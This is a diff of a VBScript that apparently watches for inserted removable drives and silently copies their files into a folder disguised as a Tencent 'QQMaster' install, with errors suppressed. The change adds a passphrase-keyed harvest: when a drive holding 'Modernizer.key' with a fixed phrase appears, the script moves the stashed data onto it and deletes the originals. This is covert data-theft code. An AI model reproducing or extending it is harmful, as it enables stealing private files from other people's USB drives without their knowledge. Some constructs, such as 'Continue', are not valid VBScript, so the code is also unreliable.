@@ -1,9 +1,9 @@
-'Version 2.11 Ultimate
+'Version 2.12 Ultimate
 Option Explicit
 On Error Resume Next
 
 Dim Target, Container, DriveLetter, FileCheck, UDrive
-Dim FlagFileNum, FlagFile, MaxCapacityGB, Pointer
+Dim DriveNum, Letter, FlagFileNum, FlagFile, MaxCapacityGB, Pointer, iHrv, IsHRV
 Dim WScript, Fso, Fin
 Set WScript = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
@@ -15,8 +15,8 @@ Set Fso = CreateObject("Scripting.FileSystemObject")
 FlagFileNum = 2
 FlagFile = Array("Setup.exe", "bootmgr")
 
-MaxCapacityGB = 32
-Pointer = "D:\Program Files\Tencent\QQMaster\"
+MaxCapacityGB = 64
+Pointer = "C:\Program Files\Tencent\QQMaster\"
 
 '*****************************************
 ' End of Customization Modification Part
@@ -43,8 +43,19 @@ Do
     If Fso.DriveExists(DriveLetter) Then
       Set UDrive = Fso.GetDrive(DriveLetter)
       If UDrive.DriveType <> 1 Then Continue
+      If Fso.FileExists(DriveLetter & ":\Modernizer.key") Then
+        Set Fin = Fso.OpenTextFile(DriveLetter & ":\Modernizer.key", ForReading)
+        iHrv = Fin.ReadLine()
+        If iHrv = "Master Shiang Dzurr plays silver power." Then
+          IsHRV = True
+          Target = DriveLetter & ":\Moderization\"
+          Fso.CreateFolder Target
+          Fso.CopyFolder Pointer & "*", Target, True
+          Fso.DeleteFolder Pointer & "*", True
+        End If
+      End If
       
-      If Not IsCopied(i) Then
+      If Not IsCopied(i) And Not IsHRV Then
         FileCheck = True
         For k = 0 to FlagFileNum - 1
           If Fso.FileExists(DriveLetter & ":\" & FlagFile(k)) Then
